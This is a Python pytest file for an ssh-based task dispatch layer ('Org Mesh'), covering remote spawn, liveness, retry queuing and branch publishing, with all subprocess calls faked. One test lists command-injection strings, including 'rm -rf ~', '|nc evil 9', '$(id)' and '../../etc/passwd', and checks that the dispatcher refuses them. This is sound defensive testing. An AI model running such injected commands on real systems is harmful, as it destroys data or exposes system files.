"""Org Mesh W2.3 (docs/design/org-mesh.md, W2): lib/mesh.py and its three callers,
tools/delegate.py (`_spawn_remote`), runners/watchdog.py and runners/branch_poller.py,
all behind ORG_MESH_DISPATCH (default off).

Fakes only. subprocess.run is a recorder (no ssh ever leaves this process),
tools.node_dispatch.dispatch stands in for the in-process self path, and lib.db
points at a tmp_path SQLite ledger (ADR 0021). config/hosts.yaml is read as-is:
self is pinned to "mac" (ssh: null), the remote is "contabo" (a real alias).

Run:  .venv/bin/python -m pytest tests/test_w23_mesh_dispatch.py
"""
from __future__ import annotations

import asyncio
import json
import subprocess
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from lib import config, mesh  # noqa: E402
from lib import db as db_mod  # noqa: E402
from lib import notify as notify_mod  # noqa: E402
import runners.branch_poller as poller  # noqa: E402
import runners.watchdog as watchdog  # noqa: E402
from tools import delegate  # noqa: E402
from tools import node_dispatch as nd  # noqa: E402
from tools import worker_reap  # noqa: E402

TID = "task-1234abcd"
PROJECT = "mooniex-agents"


@pytest.fixture(autouse=True)
def _isolated(monkeypatch, tmp_path):
    monkeypatch.setattr(db_mod, "DB_PATH", tmp_path / "tasks.db")
    db_mod.init()
    monkeypatch.setenv("ORG_CHARTER_GATE", "off")
    monkeypatch.setenv("ORG_HOST", "mac")
    monkeypatch.setenv("HOME", str(tmp_path))  # the org_dispatch key path expands from it
    monkeypatch.delenv(mesh.ENV_FLAG, raising=False)
    # success()/error() would run osascript on the Mac: silence the notifier, keep the rest.
    monkeypatch.setattr(notify_mod, "notify", lambda *a, **kw: None)
    config.self_host.cache_clear()
    yield
    config.self_host.cache_clear()


@pytest.fixture()
def flag_on(monkeypatch):
    monkeypatch.setenv(mesh.ENV_FLAG, "1")


# ---------------------------------------------------------------------------
# fakes
# ---------------------------------------------------------------------------

class FakeRun:
    """subprocess.run, recorded. `raises` is raised; otherwise a CompletedProcess."""

    def __init__(self, stdout: str = "", returncode: int = 0, stderr: str = "",
                 raises: BaseException | None = None) -> None:
        self.stdout, self.returncode, self.stderr, self.raises = stdout, returncode, stderr, raises
        self.calls: list[tuple[list[str], dict]] = []

    def __call__(self, argv, **kw):
        self.calls.append((list(argv), kw))
        if self.raises is not None:
            raise self.raises
        return subprocess.CompletedProcess(argv, self.returncode, self.stdout, self.stderr)


def _reply(ok: bool = True, verb: str = "pid_alive", **extra) -> str:
    return json.dumps({"ok": ok, "verb": verb, **extra}) + "\n"


def _no_subprocess(monkeypatch) -> None:
    def boom(argv, **kw):
        raise AssertionError(f"subprocess must not run: {argv}")
    monkeypatch.setattr(subprocess, "run", boom)


def _no_mesh(monkeypatch) -> None:
    def boom(*a, **kw):
        raise AssertionError(f"lib.mesh must not be used: {a}")
    monkeypatch.setattr(mesh, "dispatch", boom)
    monkeypatch.setattr(mesh, "build_argv", boom)


class FakeMesh:
    """Stands in for mesh.dispatch. `script(host, verb, args)` returns a reply
    dict or raises; every call is recorded first."""

    def __init__(self, script) -> None:
        self.script, self.calls = script, []

    def __call__(self, host, verb, *args, timeout=None):
        self.calls.append((host, verb, args))
        return self.script(host, verb, args)


def _down(host, verb, args):
    raise mesh.MeshUnreachable(f"{verb} on {host}: no route")


def _ok(host, verb, args):
    return {"ok": True, "verb": verb, "result": {}}


def _row(touches: list[str] | None = None, **cols) -> str:
    tid = db_mod.create_task(PROJECT, "developer", "t", "d", touches=touches)
    if cols:
        sets = ", ".join(f"{k}=?" for k in cols)
        with db_mod.get_conn() as conn:
            conn.execute(f"UPDATE tasks SET {sets} WHERE id=?", (*cols.values(), tid))
    return tid


def _ago(minutes: int) -> str:
    return (datetime.now(timezone.utc) - timedelta(minutes=minutes)).strftime("%Y-%m-%dT%H:%M:%SZ")


def _spawn(tid: str, host: str = "contabo", **kw) -> dict:
    return asyncio.run(delegate._spawn_remote(db_mod.get_task(tid), host, **kw))


def _queue(monkeypatch, tid: str) -> None:
    """Put `tid` in queued_remote the way a real first attempt does."""
    monkeypatch.setattr(mesh, "dispatch", FakeMesh(_down))
    delegate.mesh_spawn_worker(tid, "contabo")
    assert db_mod.get_task(tid)["status"] == "queued_remote"


def _key(tmp_path: Path) -> str:
    return str(tmp_path / ".ssh" / "org_dispatch")


# ---------------------------------------------------------------------------
# lib/mesh.py
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("value,expected", [
    ("1", True), ("true", True), ("on", True), ("TRUE", True), (" On ", True),
    ("0", False), ("off", False), ("false", False), ("", False), ("yes", False),
])
def test_enabled_reads_the_env_flag(monkeypatch, value, expected):
    monkeypatch.setenv(mesh.ENV_FLAG, value)
    assert mesh.enabled() is expected


def test_enabled_is_off_by_default():
    assert mesh.enabled() is False


def test_self_host_runs_in_process(monkeypatch):
    calls = []

    def fake_dispatch(verb, args):
        calls.append((verb, args))
        return {"ok": True, "verb": verb, "result": {"alive": True}}

    monkeypatch.setattr(nd, "dispatch", fake_dispatch)
    _no_subprocess(monkeypatch)
    out = mesh.dispatch("mac", "pid_alive", TID)
    assert out == {"ok": True, "verb": "pid_alive", "result": {"alive": True}}
    assert calls == [("pid_alive", [TID])]


def test_remote_builds_the_exact_ssh_argv(monkeypatch, tmp_path):
    fake = FakeRun(stdout=_reply(verb="spawn_worker", result={"id": TID}))
    monkeypatch.setattr(subprocess, "run", fake)
    out = mesh.dispatch("contabo", "spawn_worker", TID)
    assert out == {"ok": True, "verb": "spawn_worker", "result": {"id": TID}}
    (argv, kw), = fake.calls
    assert argv == ["ssh", "-i", _key(tmp_path),
                    "-o", "BatchMode=yes", "-o", "ConnectTimeout=10",
                    config.host("contabo")["ssh"], f"spawn_worker {TID}"]
    assert kw["stdin"] is subprocess.DEVNULL
    assert kw["capture_output"] is True and kw["text"] is True


def test_remote_argv_carries_every_arg_of_a_multi_arg_verb(monkeypatch):
    role = config.live_c_level_roles()[0]
    fake = FakeRun(stdout=_reply(verb="start_clevel"))
    monkeypatch.setattr(subprocess, "run", fake)
    mesh.dispatch("contabo", "start_clevel", role, "--resume", "abcd1234")
    assert fake.calls[0][0][-1] == f"start_clevel {role} --resume abcd1234"


def test_timeout_defaults_per_verb_and_can_be_overridden(monkeypatch):
    fake = FakeRun(stdout=_reply())
    monkeypatch.setattr(subprocess, "run", fake)
    mesh.dispatch("contabo", "pid_alive", TID)
    mesh.dispatch("contabo", "spawn_worker", TID)
    mesh.dispatch("contabo", "publish_branch", TID)
    mesh.dispatch("contabo", "pid_alive", TID, timeout=7)
    assert [kw["timeout"] for _, kw in fake.calls] == [
        mesh.DEFAULT_TIMEOUT_S, mesh.VERB_TIMEOUT_S["spawn_worker"],
        mesh.VERB_TIMEOUT_S["publish_branch"], 7]


@pytest.mark.parametrize("verb,args", [
    ("pid_alive", (f"{TID}; rm -rf ~",)),
    ("pid_alive", (f"{TID} && id",)),
    ("pid_alive", (f"{TID}|nc evil 9",)),
    ("pid_alive", (f"{TID}\n",)),
    ("spawn_worker", ("$(id)",)),
    ("kill_worker", ("`id`",)),
    ("publish_branch", ("../../etc/passwd",)),
    ("pid_alive", (TID, "extra")),
    ("pid_alive", ()),
    ("pid_alive", ("",)),
    ("deliver_letter", ("1 2",)),
    ("start_clevel", ("cmo; id",)),
    ("bash", ("-c", "id")),
    ("", ()),
])
def test_injection_looking_input_is_refused_before_ssh(monkeypatch, verb, args):
    fake = FakeRun(stdout=_reply())
    monkeypatch.setattr(subprocess, "run", fake)
    out = mesh.dispatch("contabo", verb, *args)
    assert out["ok"] is False and out["error"]
    assert fake.calls == []


@pytest.mark.parametrize("fake", [
    FakeRun(raises=subprocess.TimeoutExpired(["ssh"], 30)),
    FakeRun(returncode=255, stderr="ssh: connect to host x port 22: Connection timed out"),
    FakeRun(raises=OSError("ssh not found")),
    FakeRun(stdout="not json at all\n"),
    FakeRun(stdout=""),
    FakeRun(stdout="[1, 2]\n"),
    FakeRun(stdout='{"verb": "pid_alive"}\n'),
    FakeRun(stdout='{"ok": "yes"}\n'),
    FakeRun(returncode=1, stderr="Traceback (most recent call last): ..."),
], ids=["timeout", "ssh-255", "no-ssh-binary", "not-json", "empty", "list", "no-ok", "ok-not-bool",
        "remote-crash"])
def test_no_reply_is_meshunreachable(monkeypatch, fake):
    monkeypatch.setattr(subprocess, "run", fake)
    with pytest.raises(mesh.MeshUnreachable):
        mesh.dispatch("contabo", "pid_alive", TID)
    assert len(fake.calls) == 1


@pytest.mark.parametrize("returncode", [1, 2])
def test_a_verb_refusal_is_the_error_dict_not_an_exception(monkeypatch, returncode):
    body = _reply(ok=False, error="task task-1234abcd is on host 'winbox', this host is 'contabo'")
    monkeypatch.setattr(subprocess, "run", FakeRun(stdout=body, returncode=returncode))
    out = mesh.dispatch("contabo", "pid_alive", TID)
    assert out["ok"] is False and "this host is" in out["error"]


def test_the_last_stdout_line_is_the_reply(monkeypatch):
    monkeypatch.setattr(subprocess, "run", FakeRun(stdout="motd line\n\n" + _reply(result={"alive": True})))
    assert mesh.dispatch("contabo", "pid_alive", TID)["result"] == {"alive": True}


def test_a_host_with_no_ssh_alias_is_unreachable_and_never_dialled(monkeypatch):
    monkeypatch.setenv("ORG_HOST", "contabo")
    config.self_host.cache_clear()
    _no_subprocess(monkeypatch)
    with pytest.raises(mesh.MeshUnreachable, match="no ssh alias"):
        mesh.dispatch("mac", "pid_alive", TID)  # the Mac's sshd is closed by design


def test_an_unknown_host_is_a_config_error_not_unreachable(monkeypatch):
    _no_subprocess(monkeypatch)
    with pytest.raises(ValueError):
        mesh.dispatch("nowhere", "pid_alive", TID)


# ---------------------------------------------------------------------------
# db: queued_remote is a status, and an active one
# ---------------------------------------------------------------------------

def test_queued_remote_is_valid_and_active_not_terminal():
    assert "queued_remote" in db_mod.VALID_STATUS
    assert "queued_remote" in db_mod.ACTIVE_STATUSES
    # the surface sweep is VALID - ACTIVE - {...}: a queued row must not join it
    assert "queued_remote" not in watchdog.TERMINAL_SURFACE_STATUSES
    assert "queued_remote" not in worker_reap._TERMINAL_SURFACE_STATUSES
    assert "queued_remote" not in db_mod.RELEASING_STATUSES  # path locks stay held


def test_a_merged_task_is_not_resurrected_into_queued_remote():
    tid = _row()
    db_mod.update_status(tid, "merged", actor="test")
    assert db_mod.update_status(tid, "queued_remote", actor="test") is False
    assert db_mod.get_task(tid)["status"] == "merged"


# ---------------------------------------------------------------------------
# tools/delegate.py
# ---------------------------------------------------------------------------

def test_flag_on_remote_spawn_is_one_spawn_worker_through_mesh(monkeypatch, flag_on):
    _no_subprocess(monkeypatch)  # no launcher ssh, no scp, no deploy probe
    tid = _row()
    seen = []

    def remote_spawns(host, verb, args):
        row = db_mod.get_task(tid)
        seen.append((row["status"], row["host"]))
        db_mod.update_status(tid, "in_progress", pid=4242, host=host, actor="test")
        return {"ok": True, "verb": verb, "result": {"id": tid}}

    fake = FakeMesh(remote_spawns)
    monkeypatch.setattr(mesh, "dispatch", fake)
    row = _spawn(tid)
    assert fake.calls == [("contabo", "spawn_worker", (tid,))]
    assert seen == [("pending", "contabo")]  # the verb needs a pending row on that host
    assert row["status"] == "in_progress"


def test_flag_on_unreachable_queues_the_row_and_returns(monkeypatch, flag_on):
    tid = _row(touches=["lib/x.py"])
    assert db_mod.lock_paths(tid, PROJECT, ["lib/x.py"])[0]
    monkeypatch.setattr(mesh, "dispatch", FakeMesh(_down))
    row = _spawn(tid)  # must not raise
    assert row["status"] == "queued_remote"
    assert row["host"] == "contabo"
    assert "unreachable (attempt 1)" in row["delegate_log"] and "no route" in row["delegate_log"]
    # not failed: the path locks stay held for the retry
    assert db_mod.lock_paths("task-00000000", PROJECT, ["lib/x.py"])[0] is False
    assert db_mod.find_conflicts(PROJECT, ["lib/x.py"], exclude_task="task-00000000")


def test_flag_on_a_refusal_fails_the_task_like_a_failed_launcher(monkeypatch, flag_on):
    tid = _row()
    monkeypatch.setattr(mesh, "dispatch", FakeMesh(
        lambda h, v, a: {"ok": False, "verb": v, "error": "no such task"}))
    row = _spawn(tid)
    assert row["status"] == "failed"
    assert "said no: no such task" in row["delegate_log"]


def test_flag_on_a_refusal_after_the_far_side_moved_the_row_leaves_it(monkeypatch, flag_on):
    tid = _row()

    def far_side_blocks(host, verb, args):
        db_mod.update_status(tid, "blocked_host", actor="test")
        return {"ok": False, "verb": verb, "error": "task is blocked_host after spawn"}

    monkeypatch.setattr(mesh, "dispatch", FakeMesh(far_side_blocks))
    assert _spawn(tid)["status"] == "blocked_host"


def test_flag_on_dry_run_prints_the_mesh_command_and_sends_nothing(monkeypatch, flag_on):
    _no_subprocess(monkeypatch)
    monkeypatch.setattr(mesh, "dispatch", FakeMesh(_down))
    tid = _row()
    row = _spawn(tid, dry_run=True)
    log = row["delegate_log"]
    assert log.startswith("[dry-run] host=contabo mesh_cmd=ssh -i ")
    assert f"spawn_worker {tid}" in log and "BatchMode=yes" in log
    assert row["status"] == "pending"


@pytest.mark.parametrize("flag", [None, "0", "off", ""])
def test_flag_off_contabo_is_todays_launcher_ssh(monkeypatch, flag):
    if flag is not None:
        monkeypatch.setenv(mesh.ENV_FLAG, flag)
    _no_mesh(monkeypatch)
    tid = _row()
    log = _spawn(tid, "contabo", dry_run=True)["delegate_log"]
    alias = config.host("contabo")["ssh"]
    assert log.startswith(f"[dry-run] host=contabo ssh_cmd=ssh {alias} ")
    assert f"--task {tid}" in log and "mesh" not in log


@pytest.mark.parametrize("flag", [None, "0", "off", ""])
def test_flag_off_winbox_is_todays_launcher_ssh(monkeypatch, flag):
    if flag is not None:
        monkeypatch.setenv(mesh.ENV_FLAG, flag)
    _no_mesh(monkeypatch)
    tid = _row()
    log = _spawn(tid, "winbox", dry_run=True)["delegate_log"]
    alias = config.host("winbox")["ssh"]
    assert log.startswith(f"[dry-run] host=winbox ssh_cmd=ssh {alias} ")
    assert f'-Task "{tid}"' in log and "mesh" not in log


def test_flag_on_a_local_launcher_spawn_is_not_a_mesh_spawn(monkeypatch, flag_on):
    """`local` (a Linux hub's own codex/agy run) is not a remote spawn."""
    _no_mesh(monkeypatch)
    tid = _row()
    log = _spawn(tid, "contabo", dry_run=True, local=True)["delegate_log"]
    assert log.startswith("[dry-run] host=contabo local_cmd=bash ") and "mesh" not in log


def test_flag_on_a_spawn_on_this_very_host_is_not_a_mesh_spawn(monkeypatch, flag_on):
    _no_mesh(monkeypatch)
    monkeypatch.setenv("ORG_HOST", "contabo")
    config.self_host.cache_clear()
    tid = _row()
    log = _spawn(tid, "contabo", dry_run=True)["delegate_log"]
    assert "ssh_cmd=" in log and "mesh" not in log


# ---------------------------------------------------------------------------
# runners/watchdog.py -- queued_remote retry
# ---------------------------------------------------------------------------

def test_watchdog_retries_once_per_pass_and_counts_attempts(monkeypatch, flag_on):
    tid = _row()
    _queue(monkeypatch, tid)  # attempt 1, at delegate time
    fake = FakeMesh(_down)
    monkeypatch.setattr(mesh, "dispatch", fake)

    first = watchdog._retry_queued_remote()
    assert fake.calls == [("contabo", "spawn_worker", (tid,))]
    assert first == [{"task": tid, "host": "contabo", "status": "queued_remote"}]
    second = watchdog._retry_queued_remote()
    assert len(fake.calls) == 2  # two passes = two attempts, not four
    assert second == first

    row = db_mod.get_task(tid)
    assert row["status"] == "queued_remote" and row["host"] == "contabo"
    assert "attempt 3" in row["delegate_log"]
    assert delegate._queued_remote_attempts(tid) == 3


def test_scan_once_runs_the_retry_pass_once(monkeypatch, flag_on):
    monkeypatch.setattr(watchdog, "gc_stale_tasks", lambda: [])
    monkeypatch.setattr(watchdog, "sweep_terminal_surfaces", lambda: [])
    monkeypatch.setattr(watchdog, "_drain_disk_queue", lambda: None)
    monkeypatch.setattr(watchdog.work_watch, "watch",
                        lambda: {"alerted": [], "lungnote_filed": [], "green": []})
    tid = _row()
    _queue(monkeypatch, tid)
    fake = FakeMesh(_down)
    monkeypatch.setattr(mesh, "dispatch", fake)
    watchdog.scan_once()
    watchdog.scan_once()
    assert fake.calls == [("contabo", "spawn_worker", (tid,))] * 2


def test_a_successful_retry_clears_the_queued_row(monkeypatch, flag_on):
    tid = _row()
    _queue(monkeypatch, tid)
    seen = []

    def remote_spawns(host, verb, args):
        row = db_mod.get_task(tid)
        seen.append((row["status"], row["host"]))
        db_mod.update_status(tid, "in_progress", pid=4242, host=host, actor="test")
        return {"ok": True, "verb": verb, "result": {"id": tid}}

    fake = FakeMesh(remote_spawns)
    monkeypatch.setattr(mesh, "dispatch", fake)
    assert watchdog._retry_queued_remote() == [
        {"task": tid, "host": "contabo", "status": "in_progress"}]
    assert seen == [("pending", "contabo")]  # flipped for the verb, which needs pending
    assert db_mod.list_tasks(status="queued_remote") == []
    assert watchdog._retry_queued_remote() == []
    assert len(fake.calls) == 1  # nothing queued, nothing sent


def test_a_row_another_box_dispatched_is_not_ours_to_retry(monkeypatch, flag_on):
    tid = _row(dispatcher_host="contabo", host="winbox", status="queued_remote")
    fake = FakeMesh(_down)
    monkeypatch.setattr(mesh, "dispatch", fake)
    assert watchdog._retry_queued_remote() == []
    assert fake.calls == []
    assert db_mod.get_task(tid)["status"] == "queued_remote"


def test_flag_off_the_retry_pass_does_nothing(monkeypatch):
    tid = _row()
    _queue(monkeypatch, tid)
    _no_mesh(monkeypatch)
    assert watchdog._retry_queued_remote() == []
    assert db_mod.get_task(tid)["status"] == "queued_remote"


# ---------------------------------------------------------------------------
# runners/watchdog.py -- remote liveness
# ---------------------------------------------------------------------------

def _stall_candidate() -> dict:
    tid = _row(host="contabo", status="in_progress", pid=4242, updated_at=_ago(40))
    return db_mod.get_task(tid)


def _stub_probe(monkeypatch, *, alive) -> list:
    """Stand-in for today's ssh liveness probe; returns the list of its calls."""
    calls = []

    def probe(host_cfg, pid):
        calls.append(pid)
        return alive

    monkeypatch.setattr(watchdog, "remote_pid_alive", probe)
    return calls


def test_flag_on_pid_alive_replaces_the_ssh_liveness_probe(monkeypatch, flag_on):
    task = _stall_candidate()
    probe = _stub_probe(monkeypatch, alive=True)  # would say alive; must not be asked
    _no_subprocess(monkeypatch)
    monkeypatch.setattr(watchdog, "_file_stalled_issue", lambda t, s: "issue-1")
    fake = FakeMesh(lambda h, v, a: {"ok": True, "verb": v,
                                     "result": {"task_id": a[0], "pid": 4242, "alive": False}})
    monkeypatch.setattr(mesh, "dispatch", fake)

    result = watchdog._check_remote_stall(task, "contabo")

    assert fake.calls == [("contabo", "pid_alive", (task["id"],))]
    assert probe == []
    assert result["pid_alive"] is False and result["host"] == "contabo"
    assert db_mod.get_task(task["id"])["status"] == "stalled"


def test_flag_on_alive_pid_still_reads_heartbeat_the_todays_way(monkeypatch, flag_on):
    """node_dispatch's pid_alive reply is {task_id, pid, alive}: no heartbeat age,
    so HEARTBEAT staleness stays on read_remote_heartbeat (ssh cat/type)."""
    task = _stall_candidate()
    probe = _stub_probe(monkeypatch, alive=True)
    monkeypatch.setattr(mesh, "dispatch", FakeMesh(
        lambda h, v, a: {"ok": True, "verb": v, "result": {"task_id": a[0], "pid": 4242, "alive": True}}))
    reads = []
    monkeypatch.setattr(watchdog, "read_remote_heartbeat",
                        lambda host_cfg, t: reads.append(t["id"]) or _ago(25))
    monkeypatch.setattr(watchdog, "_file_stalled_issue", lambda t, s: "issue-2")

    result = watchdog._check_remote_stall(task, "contabo")

    assert reads == [task["id"]] and probe == []
    assert result["pid_alive"] is True and result["heartbeat_age_s"] >= 20 * 60
    assert db_mod.get_task(task["id"])["status"] == "stalled"


def test_flag_on_no_answer_is_unknown_never_dead(monkeypatch, flag_on):
    task = _stall_candidate()
    probe = _stub_probe(monkeypatch, alive=False)
    monkeypatch.setattr(mesh, "dispatch", FakeMesh(_down))
    monkeypatch.setattr(watchdog, "_file_stalled_issue", lambda t, s: "must-not-file")
    assert watchdog._check_remote_stall(task, "contabo") is None
    assert probe == []
    assert db_mod.get_task(task["id"])["status"] == "in_progress"


def test_flag_on_a_box_that_cannot_say_falls_back_to_the_ssh_probe(monkeypatch, flag_on):
    """windows refuses pid_alive until W3.3: no blinder than with the flag off."""
    task = _stall_candidate()
    probe = _stub_probe(monkeypatch, alive=False)
    monkeypatch.setattr(mesh, "dispatch", FakeMesh(
        lambda h, v, a: {"ok": False, "verb": v, "error": "pid_alive is not supported on windows"}))
    monkeypatch.setattr(watchdog, "_file_stalled_issue", lambda t, s: "issue-3")
    result = watchdog._check_remote_stall(task, "contabo")
    assert probe == [4242]
    assert result["pid_alive"] is False
    assert db_mod.get_task(task["id"])["status"] == "stalled"


def test_flag_off_liveness_is_todays_ssh_probe(monkeypatch):
    task = _stall_candidate()
    probe = _stub_probe(monkeypatch, alive=False)
    _no_mesh(monkeypatch)
    monkeypatch.setattr(watchdog, "_file_stalled_issue", lambda t, s: "issue-4")
    result = watchdog._check_remote_stall(task, "contabo")
    assert probe == [4242]
    assert result["pid_alive"] is False


# ---------------------------------------------------------------------------
# runners/branch_poller.py -- publish_branch
# ---------------------------------------------------------------------------

def _poll(monkeypatch, *, host, dispatcher, runner=None, script=_ok) -> tuple[list, str]:
    """One check_task tick over an in_progress row with a branch. Returns the
    ordered events (("publish", host, verb, args) for a mesh call,
    ("branch_lookup",) for the origin check) and the task id."""
    events: list = []
    tid = _row()
    with db_mod.get_conn() as conn:
        conn.execute("UPDATE tasks SET status='in_progress', branch=?, host=?, dispatcher_host=?, "
                     "runner=? WHERE id=?",
                     (f"agent/developer-{tid}", host, dispatcher, runner, tid))
    fake = FakeMesh(script)

    def dispatch(h, v, *a, timeout=None):
        events.append(("publish", h, v, a))
        return fake(h, v, *a)

    monkeypatch.setattr(mesh, "dispatch", dispatch)
    monkeypatch.setattr(poller, "get_project", lambda key: {"path": "/repo", "default_branch": "main"})
    monkeypatch.setattr(poller, "remote_branch_exists",
                        lambda repo, branch: events.append(("branch_lookup",)) or False)
    poller.check_task(db_mod.get_task(tid))
    return events, tid


@pytest.mark.parametrize("host,dispatcher", [
    ("contabo", "mac"), ("winbox", "mac"), ("contabo", None),
])
def test_publish_branch_is_sent_first_when_dispatcher_differs_from_host(
        monkeypatch, flag_on, host, dispatcher):
    events, tid = _poll(monkeypatch, host=host, dispatcher=dispatcher)
    assert events == [("publish", host, "publish_branch", (tid,)), ("branch_lookup",)]


@pytest.mark.parametrize("host,dispatcher,runner", [
    ("mac", "mac", "agy"),       # this box's own launcher run: dispatcher == host
    (None, "mac", "codex"),
    ("mac", None, "agy"),
])
def test_publish_branch_is_not_sent_when_dispatcher_is_the_host(
        monkeypatch, flag_on, host, dispatcher, runner):
    events, _ = _poll(monkeypatch, host=host, dispatcher=dispatcher, runner=runner)
    assert events == [("branch_lookup",)]


def test_publish_branch_is_not_sent_with_the_flag_off(monkeypatch):
    events, _ = _poll(monkeypatch, host="contabo", dispatcher="mac")
    assert events == [("branch_lookup",)]


def test_publish_branch_rule_on_the_helper_itself(monkeypatch, flag_on):
    fake = FakeMesh(_ok)
    monkeypatch.setattr(mesh, "dispatch", fake)
    poller._publish_via_mesh({"id": TID, "host": "contabo", "dispatcher_host": "contabo"})
    poller._publish_via_mesh({"id": TID, "host": "contabo", "dispatcher_host": "mac"})
    poller._publish_via_mesh({"id": TID, "host": None, "dispatcher_host": None})
    assert fake.calls == [("contabo", "publish_branch", (TID,))]


@pytest.mark.parametrize("script", [
    _down,
    lambda h, v, a: {"ok": False, "verb": v, "error": "task task-1234abcd is in_progress, "
                                                      "publish_branch needs review"},
], ids=["unreachable", "refused"])
def test_a_failed_publish_never_stops_the_branch_check(monkeypatch, flag_on, script):
    events, tid = _poll(monkeypatch, host="contabo", dispatcher="mac", script=script)
    assert events == [("publish", "contabo", "publish_branch", (tid,)), ("branch_lookup",)]
    assert db_mod.get_task(tid)["status"] == "in_progress"
